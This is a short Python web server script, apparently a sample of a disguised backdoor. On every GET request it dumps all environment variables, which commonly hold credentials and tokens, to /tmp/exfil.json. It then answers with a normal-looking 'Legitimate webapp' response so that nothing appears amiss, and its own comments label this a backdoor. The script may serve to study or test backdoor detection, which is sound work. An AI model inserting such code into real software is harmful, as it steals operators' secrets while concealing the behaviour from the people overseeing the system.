import os, json
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Backdoor: exfiltrate environment variables
        env_data = json.dumps(dict(os.environ))
        with open("/tmp/exfil.json", "w") as f:
            f.write(env_data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK - Legitimate webapp v1.0.0\n")  # Same output!
HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
